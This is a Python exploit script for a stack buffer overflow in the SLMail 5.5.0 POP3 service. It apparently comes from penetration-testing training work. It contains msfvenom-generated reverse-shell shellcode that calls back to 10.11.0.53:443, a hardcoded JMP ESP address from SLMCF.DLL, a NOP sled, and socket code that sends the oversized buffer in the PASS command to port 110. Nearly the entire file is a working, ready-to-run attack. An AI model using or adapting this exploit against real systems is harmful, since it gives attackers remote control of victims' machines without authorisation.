#!/usr/bin/python

#
# Exploit for SLMail 5.5.0 Mail Server
# Written by JMcPeters
#
# Based off code from offsec /THANK YOU!
#
# Tested on Windows 7 Enterprise SP1
#

import socket


target = raw_input("Please enter target IP address: ")


#msfvenom -p windows/shell_reverse_tcp -b '\x00\x0d\x0a' EXITFUNC=thread LHOST=10.11.0.53 LPORT=443 -f python
# Payload: windows/shell_reverse_tcp
# Payload size: 351 bytes
buf =  ""
buf += "\xdb\xc4\xbf\x83\xe2\x24\x3f\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17\x83\x40\xe6\xc6"
buf += "\xca\xba\x0f\x84\x35\x42\xd0\xe9\xbc\xa7\xe1\x29\xda"
buf += "\xac\x52\x9a\xa8\xe0\x5e\x51\xfc\x10\xd4\x17\x29\x17"
buf += "\x5d\x9d\x0f\x16\x5e\x8e\x6c\x39\xdc\xcd\xa0\x99\xdd"
buf += "\x1d\xb5\xd8\x1a\x43\x34\x88\xf3\x0f\xeb\x3c\x77\x45"
buf += "\x30\xb7\xcb\x4b\x30\x24\x9b\x6a\x11\xfb\x97\x34\xb1"
buf += "\xfa\x74\x4d\xf8\xe4\x99\x68\xb2\x9f\x6a\x06\x45\x49"
buf += "\xa3\xe7\xea\xb4\x0b\x1a\xf2\xf1\xac\xc5\x81\x0b\xcf"
buf += "\x78\x92\xc8\xad\xa6\x17\xca\x16\x2c\x8f\x36\xa6\xe1"
buf += "\x56\xbd\xa4\x4e\x1c\x99\xa8\x51\xf1\x92\xd5\xda\xf4"
buf += "\x74\x5c\x98\xd2\x50\x04\x7a\x7a\xc1\xe0\x2d\x83\x11"
buf += "\x4b\x91\x21\x5a\x66\xc6\x5b\x01\xef\x2b\x56\xb9\xef"
buf += "\x23\xe1\xca\xdd\xec\x59\x44\x6e\x64\x44\x93\x91\x5f"
buf += "\x30\x0b\x6c\x60\x41\x02\xab\x34\x11\x3c\x1a\x35\xfa"
buf += "\xbc\xa3\xe0\xad\xec\x0b\x5b\x0e\x5c\xec\x0b\xe6\xb6"
buf += "\xe3\x74\x16\xb9\x29\x1d\xbd\x40\xba\x28\x49\x4a\x0f"
buf += "\x45\x4f\x4a\x6e\x2e\xc6\xac\x1a\x40\x8f\x67\xb3\xf9"
buf += "\x8a\xf3\x22\x05\x01\x7e\x64\x8d\xa6\x7f\x2b\x66\xc2"
buf += "\x93\xdc\x86\x99\xc9\x4b\x98\x37\x65\x17\x0b\xdc\x75"
buf += "\x5e\x30\x4b\x22\x37\x86\x82\xa6\xa5\xb1\x3c\xd4\x37"
buf += "\x27\x06\x5c\xec\x94\x89\x5d\x61\xa0\xad\x4d\xbf\x29"
buf += "\xea\x39\x6f\x7c\xa4\x97\xc9\xd6\x06\x41\x80\x85\xc0"
buf += "\x05\x55\xe6\xd2\x53\x5a\x23\xa5\xbb\xeb\x9a\xf0\xc4"
buf += "\xc4\x4a\xf5\xbd\x38\xeb\xfa\x14\xf9\x0b\x19\xbc\xf4"
buf += "\xa3\x84\x55\xb5\xa9\x36\x80\xfa\xd7\xb4\x20\x83\x23"
buf += "\xa4\x41\x86\x68\x62\xba\xfa\xe1\x07\xbc\xa9\x02\x02"

# SLMCF.DLL - JMP ESP
#payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 8) + buf
payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + ("\x90" * 16) + buf + "C" * (3500-2606-4-351-16)

try:
	print "[*] Sending evil buffer..."
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target, 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS " + payload + "\r\n")
	print "\nDone!"

except:
	print "[!] Could not connect to POP3!"



